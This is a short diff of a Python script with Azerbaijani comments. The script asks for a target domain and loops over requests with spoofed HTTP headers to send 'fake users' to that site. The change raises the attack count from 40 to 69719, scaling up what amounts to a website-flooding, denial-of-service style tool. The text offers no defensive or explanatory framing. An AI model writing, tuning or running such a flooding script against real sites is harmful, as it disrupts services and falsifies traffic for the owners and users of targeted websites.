@@ -15,7 +15,7 @@ HTTPHeaders = [
     # en-US,en;q=0.5
 ]
 hostName = input("domain daxil edin ( www.example.com): ")
-attackCount = 40 # buradan hucum sayini artirin.
+attackCount = 69719 # buradan hucum sayini artirin.
 print("{} saytina {} eded fake user gonderilir.".format(hostName, attackCount))
 for i in range(1,attackCount+1):
     d = list(str(i))
